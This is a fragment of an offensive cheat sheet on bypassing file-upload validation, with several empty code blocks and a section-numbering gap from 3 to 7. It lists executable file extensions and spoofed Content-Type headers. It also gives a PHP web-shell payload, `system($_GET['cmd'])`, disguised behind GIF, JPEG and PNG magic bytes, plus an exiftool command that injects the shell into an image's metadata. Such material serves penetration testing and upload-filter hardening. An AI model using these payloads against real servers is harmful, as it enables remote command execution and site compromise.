### Double extensions
```

```

```

```

```
.php5 .phtml .phar .pht .php3 .php4 .php7 .inc
.asp .aspx .asmx .ashx .asa .cer .cdx .cshtml .jsp .jspx .jrw .jsw .war
.shtml .shtm .stm               (SSI - exec command)
```

## 2. CONTENT-TYPE / MIME SPOOFING
```
Content-Type: image/png       (file.ext=shell.php but CT png - some servers only check CT)
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: multipart/form-data; boundary=...
```
With body starting with magic bytes:
```
GIF89a;<?php system($_GET['cmd']); ?>          (gif signature)
\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>  (JPEG signature)
\x89PNG\r\n\x1a\n<?php ... ?>                   (PNG signature)
<?php system($_GET['cmd']); ?>
```

## 3. MAGIC BYTE BYPASS (header-only checks)
```
# append PHP after valid header
GIF89a
<?php echo 'test';?>

# exiftool injected comment → PHP executes in some parsers
exiftool -Comment='<?php system($_GET["cmd"]); ?>' evil.jpg
exiftool -Comment='<?php ?>' evil.png
```

## 7. WEBSHELLS (for authorized tests)

```

```

```

```
